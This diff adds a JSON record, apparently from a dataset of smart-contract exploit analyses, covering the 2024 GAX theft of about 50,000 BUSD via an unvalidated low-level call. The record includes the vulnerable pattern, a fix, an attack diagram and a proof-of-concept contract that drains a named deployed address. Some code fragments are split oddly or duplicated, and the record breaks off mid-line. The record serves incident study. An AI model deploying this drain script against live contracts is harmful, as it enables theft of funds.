@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-07-13_GAX_UnvalidatedLowLevelCall",
+ "source_file": "2024/2024-07-13_GAX_UnvalidatedLowLevelCall.md",
+ "title": "GAX — Analysis of BUSD Theft via Unvalidated Low-Level Call",
+ "date": "2024-07-13",
+ "protocol": "GAX",
+ "chain": "BSC",
+ "loss_raw": "~50,000 BUSD",
+ "loss_usd": null,
+ "root_cause": "Unvalidated low-level call via function selector 0x6c99d7c8",
+ "attack_tx": "0x368f...108 (block 40,375,925)",
+ "vulnerable_contract": "0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: selector 0x6c99d7c8 — processes encoded data without validation\nfunction execute(bytes calldata encodedData) external {\n    // Decodes address and amount from encodedData without validation\n    (address token, address recipient, uint256 amount) = abi.decode(\n        encodedData, (address, address, uint256)\n    );\n    IERC20(token).transfer(recipient, amount);  //",
+  "❌ No caller validation\n}\n\n//",
+  "// File: GAX_decompiled.sol\ncontract GAX {\ncontract GAX {\n    address public owner;\n\n\n    // Selector: 0x74e6aa6f\n    function unknown_74e6aa6f() external {}  // ❌ Vulnerability\n\n    // Selector: 0xadfe9aef\n    function unknown_adfe9aef() external {}\n\n    // Selector: 0xd84e4f5a\n    function bnbBalance(address p0) external {}\n\n    // Selector: 0xf2fde38b\n    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)\n    function transferOwnership(address p0) external {}\n\n    // Selector: 0xf7260d3e\n    function receiver() external {}\n\n    // Selector: 0xfcbb727d\n    function unknown_fcbb727d() external {}\n\n    // Selector: 0xc176ecf9\n    function unknown_c176ecf9() external {}\n\n    // Selector: 0xc54e44eb\n    function USDT() external {}\n\n    // Selector: 0xc5d7eee8\n    function unknown_c5d7eee8() external {}\n\n    // Selector: 0x9c43af78\n    function unknown_9c43af78() external {}\n\n    // Selector: 0xa23bf6dc\n    function unknown_a23bf6dc() external {}\n\n    // Selector: 0xa54eeba6\n    function unknown_a54eeba6() external {}\n\n    // Selector: 0xab6b6e41\n    function unknown_ab6b6e41() external {}\n\n    // Selector: 0x87b09ba6\n    // 📌 Staking — lock period validation required\n    function stakeUSDT(uint256 p0) external {}\n\n    // Selector: 0x8da5cb5b\n    function owner() external view returns (address) {}\n\n    // Selector: 0x573a8bb9\n    function unknown_573a8bb9() external {}\n\n    // Selector: 0x65fbb50f\n    function unknown_65fbb50f() external {}\n\n    // Selector: 0x6aa90ab8\n    function unknown_6aa90ab8() external {}\n\n    // Selector: 0x6c99d7c8\n    function unknown_6c99d7c8() external {}\n\n    // Selector: 0x718da7ee\n    function setReceiver(address p0) external {}\n\n    // Selector: 0x5cc451f1\n    function unknown_5cc451f1() external {}\n\n    // Selector: 0x6360ab01\n    function unknown_6360ab01() external {}\n\n    // Selector: 0x1af979ad\n    function unknown_1af979ad() external {}\n\n    // Selector: 0x28ad4168\n    function unknown_28ad4168() external {}\n\n    // Selector: 0x2d98728d\n    function unknown_2d98728d() external {}\n\n    // Selector: 0x4828ae67\n    function unknown_4828ae67() external {}\n\n    // Selector: 0x01e33667\n    // 📌 Withdrawal — reserve validation required\n    function withdrawToken(address p0, address p1, uint256 p2) external {}\n\n    // Selector: 0x0a75bf14\n    function unknown_0a75bf14() external {}\n\n    // Selector: 0x1252b9b7\n    function unknown_1252b9b7() external {}\n\n    // Selector: 0x70a08231\n    function balanceOf(address p0) external view returns (uint256) {}\n\n    // Selector: 0xdd62ed3e\n    function allowance(address p0, address p1) external view returns (uint256) {}\n\n    // Selector: 0xa9059cbb\n    function transfer(address p0, uint256 p1) external {}\n\n    // Selector: 0x23b872dd\n    // 📌 Arbitrary transferFrom — approval validation required\n    function transferFrom(address p0, address p1, uint256 p2) external {}\n\n    // Selector: 0x774297ee\n    function unknown_774297ee() external {}\n}"
+ ],
+ "code_after": [
+  "✅ Correct code: restrict execution to admin only via access control\nfunction execute(bytes calldata encodedData) external onlyOwner {  //",
+  "✅ Access control\n    (address token, address recipient, uint256 amount) = abi.decode(\n        encodedData, (address, address, uint256)\n    );\n    require(amount <= withdrawLimit, \"Exceeds limit\");  //"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Query BUSD balance of GAX vulnerable contract (0xdb4b73)\n  │         └─► BUSD.balanceOf(0xdb4b73Df) = ~50,000 BUSD\n  │\n  ├─[2]─► Call function via selector 0x6c99d7c8\n  │         └─► encodedData = abi.encode(BUSD, attacker, 50000e18)\n  │\n  ├─[3]─► Contract executes BUSD.transfer(attacker, 50000e18) without validation\n  │\n  └─[4]─► Total loss: ~50,000 BUSD",
+  "contract AttackContract {\n    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    address constant GAX_VULN = 0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b;\n\n    function testExploit() external {\n        // [1] Check BUSD balance held by the vulnerable contract\n        uint256 balance = BUSD.balanceOf(GAX_VULN);\n\n        // [2] Low-level call via selector 0x6c99d7c8\n        // encodedData: BUSD contract, recipient (attacker), amount\n        bytes memory encodedData = abi.encode(\n            address(BUSD),\n            address(this),  // attacker address\n            balance\n        );\n        GAX_VULN.call(\n            abi.encodeWithSelector(bytes4(0x6c99d7c8), encodedData)\n        );\n\n        // [3] Full BUSD balance drained\n        emit log_named_decimal_uint(\"Stole"
+ ]
+}
